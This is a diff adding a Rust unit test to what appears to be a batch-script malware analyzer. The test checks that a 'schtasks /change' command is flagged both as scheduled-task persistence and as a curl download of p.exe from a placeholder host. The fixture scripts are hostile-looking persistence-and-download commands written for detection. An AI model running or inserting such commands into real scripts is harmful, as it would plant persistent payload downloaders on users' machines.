@@ -1957,6 +1957,37 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
     }
 
     #[test]
+    fn schtasks_change_tr_recurses_into_nested_download() {
+        let script = br#"@echo off
+setlocal DisableDelayedExpansion
+schtasks /change /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks-change.example/p.exe&&curl -o out.exe !U!"
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, command, .. }
+                    if hive == "ScheduledTask"
+                        && key == "Updater"
+                        && command.contains("schtasks-change.example/p.exe")
+            )),
+            "changed scheduled-task action persistence missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://schtasks-change.example/p.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "changed scheduled-task action download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn schtasks_create_unquoted_tr_captures_full_child_command() {
         let script = br#"@echo off
 schtasks /create /tn Updater /tr cmd.exe /c curl -o out.exe https://schtasks-unquoted.example/p.exe /sc once /st 00:00
